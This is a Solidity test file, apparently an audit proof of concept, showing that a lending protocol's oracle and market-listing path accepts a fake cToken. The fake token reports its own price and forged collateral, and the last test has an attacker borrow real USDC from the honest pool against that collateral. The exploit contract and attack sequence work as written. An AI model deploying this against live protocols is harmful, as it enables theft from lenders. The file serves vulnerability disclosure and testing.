// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.28;

import {
    TestBaseOracleManager
} from "tests/oracles/OracleManager/TestBaseOracleManager.sol";
import {
    TestProtocolManagerDeployment
} from "tests/architecture/ProtocolManagerDeployment/TestProtocolManagerDeployment.t.sol";

import {ICToken, AccountSnapshot} from "contracts/interfaces/ICToken.sol";
import {IERC165} from "contracts/interfaces/IERC165.sol";
import {IERC20} from "contracts/interfaces/IERC20.sol";
import {IMarketManager} from "contracts/interfaces/IMarketManager.sol";
import {
    MarketManagerIsolated
} from "contracts/market/isolated/MarketManagerIsolated.sol";
import {OracleManager} from "contracts/oracles/OracleManager.sol";

contract MutableCTokenIdentityLiar {
    address public immutable underlying;
    IMarketManager public immutable marketManager;

    uint256 public exchangeRateValue = 1e18;
    mapping(address account => uint256 shares) public forgedCollateral;

    address public initializeCaller;
    address public initializeBy;

    constructor(address underlying_, IMarketManager marketManager_) {
        underlying = underlying_;
        marketManager = marketManager_;
    }

    function supportsInterface(bytes4 interfaceId)
        external
        pure
        returns (bool)
    {
        return interfaceId == type(IERC165).interfaceId
            || interfaceId == type(ICToken).interfaceId;
    }

    function asset() external view returns (address) {
        return underlying;
    }

    function isBorrowable() external pure returns (bool) {
        return false;
    }

    function initializeDeposits(address by) external returns (bool) {
        initializeCaller = msg.sender;
        initializeBy = by;
        return true;
    }

    function setExchangeRate(uint256 newExchangeRate) external {
        exchangeRateValue = newExchangeRate;
    }

    function seedForgedCollateral(address account, uint256 shares) external {
        forgedCollateral[account] = shares;
        marketManager.canCollateralize(address(this), account, shares);
    }

    function exchangeRate() external view returns (uint256) {
        return exchangeRateValue;
    }

    function exchangeRateUpdated() external view returns (uint256) {
        return exchangeRateValue;
    }

    function getSnapshotUpdated(address account)
        external
        view
        returns (AccountSnapshot memory result)
    {
        result = _snapshot(account);
    }

    function getSnapshot(address account)
        external
        view
        returns (AccountSnapshot memory result)
    {
        result = _snapshot(account);
    }

    function _snapshot(address account)
        internal
        view
        returns (AccountSnapshot memory result)
    {
        result.asset = address(this);
        result.underlying = underlying;
        result.decimals = 18;
        result.isCollateral = true;
        result.collateralPosted = forgedCollateral[account];
    }
}

contract SelfAttestedRegisteredMarketManager {
    function supportsInterface(bytes4 interfaceId)
        external
        pure
        returns (bool)
    {
        return interfaceId == type(IERC165).interfaceId
            || interfaceId == type(IMarketManager).interfaceId;
    }
}

contract CTokenAdmissionIdentityProof is TestBaseOracleManager {
    function test_registeredManagerGateStillAcceptsSelfAttestedLiar() public {
        MutableCTokenIdentityLiar unregisteredManagerLiar = new MutableCTokenIdentityLiar(
            _USDC_ADDRESS,
            IMarketManager(makeAddr("unregisteredMarketManager"))
        );

        vm.expectRevert(OracleManager.OracleManager__InvalidParameter.selector);
        oracleManager.addCTokenSupport(address(unregisteredManagerLiar));

        MutableCTokenIdentityLiar registeredManagerLiar = new MutableCTokenIdentityLiar(
            _USDC_ADDRESS, IMarketManager(address(marketManagerIsolated))
        );

        oracleManager.addCTokenSupport(address(registeredManagerLiar));

        assertEq(
            oracleManager.cTokens(address(registeredManagerLiar)),
            _USDC_ADDRESS
        );
    }

    function test_admittedLiarControlsItsReportedSharePrice() public {
        _addSinglePriceFeed();

        MutableCTokenIdentityLiar liar = new MutableCTokenIdentityLiar(
            _USDC_ADDRESS, IMarketManager(address(marketManagerIsolated))
        );
        oracleManager.addCTokenSupport(address(liar));

        (uint256 underlyingPrice, uint256 underlyingError) =
            oracleManager.getPrice(_USDC_ADDRESS, true, true);
        assertEq(underlyingError, 0);

        liar.setExchangeRate(7e18);
        (uint256 liarPrice, uint256 liarError) =
            oracleManager.getPrice(address(liar), true, true);

        assertEq(liarError, 0);
        assertEq(liarPrice, underlyingPrice * 7);
    }
}

contract PMDCTokenIdentityProof is TestProtocolManagerDeployment {
    function test_PMDListingDoesNotBindReportedManagerToHost() public {
        SelfAttestedRegisteredMarketManager otherManager =
            new SelfAttestedRegisteredMarketManager();
        centralRegistry.addMarketManager(address(otherManager));

        MutableCTokenIdentityLiar liar = new MutableCTokenIdentityLiar(
            WMON_ADDRESS, IMarketManager(address(otherManager))
        );
        oracleManager.addCTokenSupport(address(liar));

        _fundAndApprove();

        MarketManagerIsolated.TokenConfig memory liarConfig =
            _getBasicTokenConfig(address(liar), 1_000_000e18, 0);
        MarketManagerIsolated.TokenConfig memory debtConfig =
            _getBasicTokenConfig(
                address(borrowableCUSDC_MONAD), 0, 1_000_000e6
            );

        deploymentManager.deployMarket(
            address(marketManagerIsolated),
            address(liar),
            address(borrowableCUSDC_MONAD),
            liarConfig,
            debtConfig
        );

        assertTrue(marketManagerIsolated.isListed(address(liar)));
        assertEq(address(liar.marketManager()), address(otherManager));
        assertTrue(
            address(liar.marketManager()) != address(marketManagerIsolated)
        );
    }

    function test_PMDListingRevertsWithoutPriorOracleSupport() public {
        MutableCTokenIdentityLiar liar = new MutableCTokenIdentityLiar(
            WMON_ADDRESS, IMarketManager(address(marketManagerIsolated))
        );

        _fundAndApprove();

        MarketManagerIsolated.TokenConfig memory liarConfig =
            _getBasicTokenConfig(address(liar), 1_000_000e18, 0);
        MarketManagerIsolated.TokenConfig memory debtConfig =
            _getBasicTokenConfig(
                address(borrowableCUSDC_MONAD), 0, 1_000_000e6
            );

        vm.expectRevert(OracleManager.OracleManager__NotSupported.selector);
        deploymentManager.deployMarket(
            address(marketManagerIsolated),
            address(liar),
            address(borrowableCUSDC_MONAD),
            liarConfig,
            debtConfig
        );

        assertEq(marketManagerIsolated.queryTokensListed().length, 0);
        assertEq(liar.initializeCaller(), address(0));
        assertEq(IERC20(WMON_ADDRESS).balanceOf(address(deploymentManager)), 0);
    }

    function test_elevatedAdmissionThenPMDListingAllowsForgedCollateralBorrow()
        public
    {
        MutableCTokenIdentityLiar liar = new MutableCTokenIdentityLiar(
            WMON_ADDRESS, IMarketManager(address(marketManagerIsolated))
        );

        // Elevated admission accepts self-attested ICToken shape, a registered
        // manager, and a nonzero underlying without binding implementation.
        // Use a distinct elevated actor from the PMD owner to preserve the
        // source's two-stage privilege boundary in the proof.
        address elevatedAdmissionActor = makeAddr("elevatedAdmissionActor");
        centralRegistry.transferEmergencyCouncil(elevatedAdmissionActor);

        vm.prank(elevatedAdmissionActor);
        oracleManager.addCTokenSupport(address(liar));
        assertEq(oracleManager.cTokens(address(liar)), WMON_ADDRESS);

        _fundAndApprove();

        (uint256 wmonPrice, uint256 priceError) =
            oracleManager.getPrice(WMON_ADDRESS, true, true);
        assertEq(priceError, 0);
        uint256 forgedShares = (200 * 1e36 + wmonPrice - 1) / wmonPrice;

        MarketManagerIsolated.TokenConfig memory liarConfig =
            _getBasicTokenConfig(address(liar), forgedShares, 0);
        MarketManagerIsolated.TokenConfig memory debtConfig =
            _getBasicTokenConfig(
                address(borrowableCUSDC_MONAD), 0, 1_000_000e6
            );

        // The PMD owner is intentionally modeled as an untrusted hot wallet.
        // Listing accepts the liar's truthy initializeDeposits return without
        // checking reserve consumption, implementation, or manager identity.
        deploymentManager.deployMarket(
            address(marketManagerIsolated),
            address(liar),
            address(borrowableCUSDC_MONAD),
            liarConfig,
            debtConfig
        );

        assertTrue(marketManagerIsolated.isListed(address(liar)));
        assertEq(liar.initializeCaller(), address(marketManagerIsolated));
        assertEq(liar.initializeBy(), address(deploymentManager));
        assertEq(IERC20(WMON_ADDRESS).balanceOf(address(liar)), 0);
        assertEq(
            IERC20(WMON_ADDRESS).balanceOf(address(deploymentManager)),
            BASE_UNDERLYING_RESERVE
        );

        deploymentManager.unpauseMarket(address(marketManagerIsolated));

        address lender = makeAddr("lender");
        address attacker = makeAddr("attacker");
        deal(_USDC_ADDRESS, lender, 1_000e6);

        vm.startPrank(lender);
        IERC20(_USDC_ADDRESS)
            .approve(address(borrowableCUSDC_MONAD), type(uint256).max);
        borrowableCUSDC_MONAD.deposit(1_000e6, lender);
        vm.stopPrank();

        assertGt(borrowableCUSDC_MONAD.balanceOf(lender), 0);
        uint256 honestPoolCashBefore =
            IERC20(_USDC_ADDRESS).balanceOf(address(borrowableCUSDC_MONAD));
        uint256 honestPoolDebtBefore =
            borrowableCUSDC_MONAD.marketOutstandingDebt();

        vm.prank(attacker);
        vm.expectRevert(
            MarketManagerIsolated.MarketManager__InsufficientCollateral
            .selector
        );
        borrowableCUSDC_MONAD.borrow(100e6, attacker);

        liar.seedForgedCollateral(attacker, forgedShares);

        vm.prank(attacker);
        borrowableCUSDC_MONAD.borrow(100e6, attacker);

        assertEq(IERC20(_USDC_ADDRESS).balanceOf(attacker), 100e6);
        assertEq(
            IERC20(_USDC_ADDRESS).balanceOf(address(borrowableCUSDC_MONAD)),
            honestPoolCashBefore - 100e6
        );
        assertEq(
            borrowableCUSDC_MONAD.marketOutstandingDebt(),
            honestPoolDebtBefore + 100e6
        );
        assertEq(borrowableCUSDC_MONAD.debtBalance(attacker), 100e6);
        assertEq(IERC20(WMON_ADDRESS).balanceOf(address(liar)), 0);
    }
}
